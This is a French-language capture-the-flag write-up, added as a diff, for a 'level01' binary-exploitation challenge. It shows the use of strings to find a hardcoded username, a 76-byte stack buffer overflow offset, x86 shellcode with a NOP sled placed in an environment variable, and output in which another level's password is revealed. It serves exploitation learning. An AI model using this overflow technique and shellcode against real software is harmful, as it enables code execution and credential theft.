@@ -1,0 +1,37 @@
+Avec strings ./level01 on voit "dat_wil" et "admin", le login fonctionne mais pas le password:
+	$ ./level01
+	********* ADMIN LOGIN PROMPT *********
+	Enter Username: dat_wil
+	verifying username....
+
+	Enter Password:
+	admin
+	nope, incorrect password...
+
+Le premier fgets read 256char et le second 100char, on overflow apres 76 char sur le second fgets:
+	level01[0x804856d] <+157>: leal   0x1c(%esp), %eax		; $ebp - $eax = 0xffffc758 - 0xffffc70c = 76
+
+On override l'adresse de retour par l'adresse de notre shellcode qui est dans l'env (offset de 2000 pour le milieu des nop):
+0xffffd058:     milieu des 4000 nops
+0xffffdff8:     adresse de la fin de l'env
+Le shellcode fait system("/tmp/get");
+
+	$ python -c 'print "\x90"*4000 + "\x31\xc0\x50\x68\x2f\x67\x65\x74\x68\x2f\x74\x6d\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/exploit4k
+	$ export _SHELL="`cat /tmp/exploit4k`"
+	$ (echo "dat_wil"; sleep 0.5; python -c 'print "A"*80 + "\x58\xd0\xff\xff"') | ./level01
+	********* ADMIN LOGIN PROMPT *********
+	Enter Username: verifying username....
+
+	Enter Password:
+	nope, incorrect password...
+
+	cat: /home/users/level01/.pass: Permission denied
+	PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+	cat: /home/users/level03/.pass: Permission denied
+	cat: /home/users/level04/.pass: Permission denied
+	cat: /home/users/level05/.pass: Permission denied
+	cat: /home/users/level06/.pass: Permission denied
+	cat: /home/users/level07/.pass: Permission denied
+	cat: /home/users/level08/.pass: Permission denied
+	cat: /home/users/level09/.pass: Permission denied
+	cat: /home/users/end/.pass: Permission denied
